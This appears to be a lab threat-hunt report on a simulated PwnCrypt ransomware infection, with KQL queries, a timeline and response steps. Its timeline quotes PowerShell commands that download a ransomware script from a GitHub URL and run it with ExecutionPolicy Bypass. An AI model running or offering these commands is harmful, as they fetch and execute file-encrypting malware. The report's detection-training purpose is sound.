
<p align="center">
  <img width="400" height="400"src=https://github.com/user-attachments/assets/d623da02-92f2-42ec-864d-126e0134d592>
</p>



# Threat Hunt Report: Pwncrypt Ransomware Scenario
- [Scenario Creation Template](https://github.com/RiqHub/Threat-hunting-scenerio-TOR/blob/main/Threat%20hunting%20scenario%20event%20creation)

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)


##  Scenario

A new ransomware strain named PwnCrypt has been reported in the news, leveraging a PowerShell-based payload to encrypt files on infected systems. The payload, using AES-256 encryption, targets specific directories such as the C:\Users\Public\Desktop, encrypting files and prepending a .pwncrypt extension to the original extension. For example, hello.txt becomes hello.pwncrypt.txt after being targeted with the ransomware. After multiple reports of encypted files from employees the CISO is concerned with the new ransomware strain being spread to the corporate network and wishes to investigate.


### Ransomware IoC Discovery Plan

- **Check `DeviceFileEvents`** for any `.pwncrypt(.txt)` file events.
- **Check `DeviceProcessEvents`** for any signs of installation or usage.
- **Check 'DeviceNetworkEvents'** to determin scope of attack


---

## Steps Taken

### 1. Searched the `DeviceFileEvents` Table

Searched the **DeviceFileEvents** table to see if there were any pwncrypt related files in it. What was discovered was files 1617_CompanyFinancials, 3871_ProjectList and 9905_EmployeeRecords were encrypted and changed to pwncrypt files. Also a decryption instrustructions file was also put on the desktop with instructions on how to gain access to the files again.



**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "riq-test"
| where ActionType in ("FileCreated", "FileRenamed")
| where FileName contains "pwncrypt"
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, FolderPath, SHA256
| order by Timestamp desce
```


![image](https://github.com/user-attachments/assets/fb9a60dc-5785-4187-8668-1f78768aa1c4)


---

### 2. Searched the `DeviceProcessEvents` Table

We pivoted to the DeviceProcesEvents logs to investigate the command that initated the "pwncrypt.ps1" script. What was found was a command to download the file from a github URL then another command to run the downloaded script immediately after. (Also, we can look up the SHA256 hash in Virus Total to see what information we can get but since this is just an example nothing will return)


**Query used to locate event:**

```kql

let VMName = "riq-test";
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessCommandLine contains "pwncrypt.ps1"
| order by Timestamp desc
| project ActionType, DeviceName, FileName, InitiatingProcessCommandLine
```


![image](https://github.com/user-attachments/assets/0b9d28a6-33db-456e-8116-eee078312106)

<br>



<p align="center">
  <img width="400" height="400"src=https://github.com/user-attachments/assets/76baffc1-8aa8-4b70-ad2f-90411fbf485c>
</p>

---

### 3. Identify Affected Users

Found that mupliple users have also been affected by 4 similar Remote IP's. May be being controled by a command and control server.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where RemoteUrl contains "githubusercontent.com" or RemoteIP in ("<Known Malicious IPs>")
| where InitiatingProcessFileName endswith "powershell.exe"
| project Timestamp, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```


![image](https://github.com/user-attachments/assets/9feb5b0f-4279-4614-82f5-ea3a9c09d1b8)

<br>

![image](https://github.com/user-attachments/assets/df11cb8b-9c2c-4166-b1cc-3a502489e235)



---




---

## Event 1: File Download
- **Timestamp:** 2025-04-01T00:13:50.8794579Z
- **Action:** ProcessCreated
- **Details:** User used powershell command to grab script from a github respo.
- **Process:** powershell.exe
- **Command:** "cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1

## Event 2: Download executed
- Timestamp: 2025-04-01T00:13:56.3190383Z
- Action: Process Created
- Details: pwncrypt executed...
- Command: "cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1 
- Path: C:\programdata\pwncrypt.ps1
## Event 3: Files encrypted 
- Timestamp: 2025-04-01T00:13:56.8901633Z
- Action: FileRenamed
- Details: 3 files encrypted with pwncrypt and a instruction file on how they can be released
- Path: C:\Users\labuser\Desktop\1617_CompanyFinancials_pwncrypt.csv





---

## Summary

A new ransomware strain, PwnCrypt, was executed on multiple endpoints, leading to file encryption and possible network compromise. The ransomware was delivered through a PowerShell script downloaded from GitHub and executed using ExecutionPolicy Bypass to evade security restrictions.

Upon execution, files in specific directories were encrypted, appending the .pwncrypt extension (e.g., 1617_CompanyFinancials.txt → 1617_CompanyFinancials_pwncrypt.txt). Network analysis revealed that infected machine communicated with four remote IP addresses, which could indicate:

- Command-and-Control (C2) communication for receiving attack instructions

- Data exfiltration (sensitive files may have been stolen before encryption)

- Potential lateral movement attempts to infect other machines on the network

---

## Response Taken

1. Isolate infected machines to prevent further encryption or lateral movement.

2. Identify and block the malicious remote IPs at the firewall and network level.

3. Review logs for data exfiltration using KQL queries to check for large outbound transfers.

4. Restore affected files from backups (if available).

5. Conduct a full forensic investigation to determine the root cause and any additional compromises.

---
